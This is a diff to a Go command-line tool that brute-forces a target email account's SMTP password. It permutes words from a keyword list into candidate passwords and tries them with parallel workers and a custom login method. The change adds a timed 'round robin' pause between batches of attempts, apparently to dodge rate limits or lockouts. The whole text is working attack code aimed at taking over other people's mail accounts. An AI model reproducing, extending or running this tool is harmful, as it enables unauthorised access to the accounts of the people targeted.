@@ -30,6 +30,7 @@ var (
 	target     string
 	data       sharedVars
 	delay      int
+	roundRobin time.Duration
 )
 
 type smtpServer struct {
@@ -90,16 +91,20 @@ func (a *lauth) Next(fromServer []byte, more bool) ([]byte, error) {
 	return nil, nil
 }
 
+// Some smtp server doesn't support the smtp.PlainAuth() method then
+// we need to make our own auth method to circumvent this issue.
 func smtpAuth(username, password string) smtp.Auth {
 	return &lauth{username, password}
 }
+
 // - - -
 
 // MAIN FUNCTION
 func main() {
-	if len(os.Args[1:]) < 7 {
+	if len(os.Args[1:]) < 8 {
 		fmt.Printf("Error: missing argument...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		// fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
 		return
 	}
 	target = os.Args[1]
@@ -108,13 +113,21 @@ func main() {
 	maxPwdLen, _ := strconv.Atoi(os.Args[5])
 	maxProcs, _ := strconv.Atoi(os.Args[6])
 	delay, _ = strconv.Atoi(os.Args[7])
+	t, _ := strconv.Atoi(os.Args[8])
+	if t <= 0 {
+		t = 1
+	} else {
+		roundRobin = time.Second * time.Duration(t)
+	}
 	if maxProcs <= 0 {
 		fmt.Printf("Error: procs must be \"1\" at least...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		// fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
 		return
 	} else if delay < 0 {
 		fmt.Printf("Error: delay must be \"0\" at least...\n")
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		// fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
 		return
 	}
 	switch mailServer.port {
@@ -122,13 +135,14 @@ func main() {
 		bruteForce(wordsReader(wordDict), maxPwdLen, maxProcs)
 	default:
 		fmt.Printf("Error: wrong port -> %s\n", mailServer.port)
-		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs]\n", os.Args[0])
+		// fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)]\n", os.Args[0])
+		fmt.Printf("Usage: %s [target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]\n", os.Args[0])
 		return
 	}
 	wg.Wait()
 	if data.accessOK != "" {
 		fmt.Println(data.AccessOKPrint())
-		fmt.Println("WARNING!!! -> Smtp Servers actually can be using evasive systems and false positive could be thrown...")
+		fmt.Printf("WARNING!!! -> Smtp Servers actually can be using evasive systems and false positive could be thrown...\n")
 	}
 }
 
@@ -266,6 +280,7 @@ func port465(pwd string) {
 }
 
 func pwdSender(maxPwdLen int, wordList []string, bfprocs chan string) {
+	t := time.Now()
 	for _, pwd := range perm(maxPwdLen, wordList) {
 		ok := data.AccessOKPrint()
 		if ok != "" {
@@ -274,6 +289,10 @@ func pwdSender(maxPwdLen int, wordList []string, bfprocs chan string) {
 			data.CounterAdd()
 		}
 		bfprocs <- pwd
+		if time.Since(t) >= roundRobin {
+			time.Sleep(roundRobin)
+			t = time.Now()
+		}
 	}
 	close(bfprocs)
 	wg.Done()
